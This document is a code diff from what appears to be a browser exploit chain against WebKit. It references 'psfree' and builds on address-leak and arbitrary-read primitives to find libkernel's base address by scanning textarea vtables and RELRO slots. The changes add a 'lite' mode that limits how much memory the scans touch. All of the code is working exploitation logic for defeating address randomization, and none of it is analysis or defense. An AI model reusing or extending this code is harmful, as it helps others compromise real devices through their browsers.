@@ -1716,21 +1716,25 @@ export function verifyLibkernelBase(p, lk, off) {
 
 /** Resolve hardcoded / session cal ext ptrs — no vtable, no code-page read. */
 function scanKnownExtPtrChunk(p, webkitBase, off, state, opts) {
+    opts = opts || {};
     if (!state) {
-        const ptrs = (opts && opts.knownExtPtrs) || [];
+        let ptrs = (opts.knownExtPtrs) || [];
+        const maxN = opts.knownMax != null ? opts.knownMax : (opts.lite ? 2 : ptrs.length);
+        if (maxN > 0 && ptrs.length > maxN) ptrs = ptrs.slice(0, maxN);
         state = { ptrs: ptrs, idx: 0 };
         if (!ptrs.length)
             return { done: true, lk: null, state: null, phase: "known-skip" };
         return { done: false, state, phase: "known-start", n: ptrs.length };
     }
 
+    const batchMax = opts.knownBatch != null ? opts.knownBatch : (opts.lite ? 1 : 2);
     let batch = 0;
-    while (state.idx < state.ptrs.length && batch < 4) {
+    while (state.idx < state.ptrs.length && batch < batchMax) {
         const raw = state.ptrs[state.idx++];
         batch++;
         const fnPtr = parseAddrSync(String(raw).replace(/^0x/i, ""));
         if (!fnPtr) continue;
-        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null);
+        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, opts);
         if (hit) {
             saveLibkernelSession(hit.lk, hit.iatRva);
             return {
@@ -1889,15 +1893,17 @@ function discoverTextareaVtables(p, opts) {
             if (pc && pc.cell) addCell(pc.label || "pair", pc.cell);
         }
     }
-    try {
-        const expCell = p.leakval(Math.expm1);
-        addCell("expm1.cell", expCell);
-    } catch (_) { }
-    try {
-        const ta = document.createElement("textarea");
-        if (opts.retain) opts.retain.push(ta);
-        addCell("fresh.ta", p.leakval(ta));
-    } catch (_) { }
+    if (!opts.lite) {
+        try {
+            const expCell = p.leakval(Math.expm1);
+            addCell("expm1.cell", expCell);
+        } catch (_) { }
+        try {
+            const ta = document.createElement("textarea");
+            if (opts.retain) opts.retain.push(ta);
+            addCell("fresh.ta", p.leakval(ta));
+        } catch (_) { }
+    }
 
     const vtables = [];
     const seenVt = new Set();
@@ -1918,6 +1924,7 @@ function discoverTextareaVtables(p, opts) {
             const vt = read8p(p, webcore18);
             if (vt) addVt(path.label + "/psfree+0x18", vt, webcore18);
         }
+        if (opts.lite) continue;
         const bfly = read8p(p, path.cell.add32(0x8));
         if (bfly && bfly.hi >= 0x8) {
             for (let slot = 0; slot < 16; slot++) {
@@ -1939,37 +1946,49 @@ function discoverTextareaVtables(p, opts) {
 }
 
 /** Resolve ext code ptr → libkernel base — never reads fnPtr (code page OOM on poops). */
-function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva) {
+function resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, iatRva, opts) {
+    opts = opts || {};
     if (!fnPtr || fnPtr.hi < 0x8) return null;
 
     const errs = kErrorCandidates(off);
-    for (let i = 0; i < errs.length; i++) {
+    const errMax = opts.lite ? 2 : errs.length;
+    for (let i = 0; i < errMax && i < errs.length; i++) {
         const lk = fnPtr.sub32(errs[i]);
         if (!lkAligned(lk)) continue;
-        if (isLibkernelPrologue(p, lk)) {
-            const v = verifyLibkernelBase(p, lk, off);
+        if (!isLibkernelPrologue(p, lk)) continue;
+        if (opts.lite) {
             return {
                 lk,
                 iatRva,
                 fnPtr,
-                strong: !!(v.ok && v.strong),
-                via: "safe-error+" + errs[i].toString(16),
+                strong: false,
+                via: "lite-error+" + errs[i].toString(16),
             };
         }
+        const v = verifyLibkernelBase(p, lk, off);
+        return {
+            lk,
+            iatRva,
+            fnPtr,
+            strong: !!(v.ok && v.strong),
+            via: "safe-error+" + errs[i].toString(16),
+        };
     }
 
-    const walked = findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, 512);
-    if (walked) {
-        if (looksLikeLibkernelModule(p, walked) || isLibkernelPrologue(p, walked)) {
-            const v = verifyLibkernelBase(p, walked, off);
-            return {
-                lk: walked,
-                iatRva,
-                fnPtr,
-                strong: !!(v.ok && v.strong),
-                via: "safe-walk" + (v.ok && v.strong ? "+stub" : ""),
-            };
-        }
+    const maxWalk = opts.maxWalkPages != null ? opts.maxWalkPages
+        : (opts.lite ? 0 : 24);
+    if (maxWalk <= 0) return null;
+
+    const walked = findModuleBaseBeforeCode(p, fnPtr, webkitBase, off, maxWalk);
+    if (walked && isLibkernelPrologue(p, walked)) {
+        const v = opts.lite ? { ok: true, strong: false } : verifyLibkernelBase(p, walked, off);
+        return {
+            lk: walked,
+            iatRva,
+            fnPtr,
+            strong: !!(v.ok && v.strong),
+            via: "safe-walk" + (v.ok && v.strong ? "+stub" : ""),
+        };
     }
 
     return null;
@@ -2206,7 +2225,7 @@ function scanRelroSlotsChunk(p, webkitBase, off, state, opts) {
 
         const fnPtr = read8p(p, state.loadBase.add32(rva));
         if (!fnPtr || !plausibleExtPtr(fnPtr, state.loadBase, off)) continue;
-        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, rva);
+        const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, rva, opts);
         if (hit) {
             saveLibkernelSession(hit.lk, hit.iatRva);
             return {
@@ -2278,6 +2297,8 @@ function scanTextareaRelroChunk(p, webkitBase, off, state, opts) {
     if (state.stage === "setup") {
         const disc = discoverTextareaVtables(p, opts);
         state.vtables = disc.vtables;
+        if (opts.lite && state.vtables.length > 1)
+            state.vtables = state.vtables.slice(0, 1);
         state.cells = disc.cells;
         state.vtListIdx = 0;
         state.vtIdx = 0;
@@ -2323,7 +2344,7 @@ function scanTextareaRelroChunk(p, webkitBase, off, state, opts) {
             const fnPtr = read8p(p, cur.vtable.add32(idx * 8));
             if (!fnPtr) continue;
             if (!plausibleExtPtr(fnPtr, webkitBase, off)) continue;
-            const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null);
+            const hit = resolveExtPtrToLibkernel(p, fnPtr, off, webkitBase, null, opts);
             if (hit) {
                 saveLibkernelSession(hit.lk, hit.iatRva);
                 return {
@@ -2439,12 +2460,19 @@ export function resolveLibkernelRelroChunk(p, webkitBase, off, state, opts) {
             return lkChunkOut(state, c, true);
         }
         if (c.done) {
-            state.stage = "abs";
-            state.sub = null;
-            opts.vtableAbs = state.vtableAbs;
             state.diag.cells = c.cells != null ? c.cells : state.diag.cells;
             state.diag.vtables = c.vtCount != null ? c.vtCount : state.diag.vtables;
             state.diag.vtExt = state.extList.length;
+            if (opts.lite || opts.safeOnly) {
+                return lkFinalMiss(state, {
+                    prev: c.phase,
+                    lite: true,
+                    error: "lite safe-only exhausted",
+                });
+            }
+            state.stage = "abs";
+            state.sub = null;
+            opts.vtableAbs = state.vtableAbs;
             return {
                 done: false,
                 state,
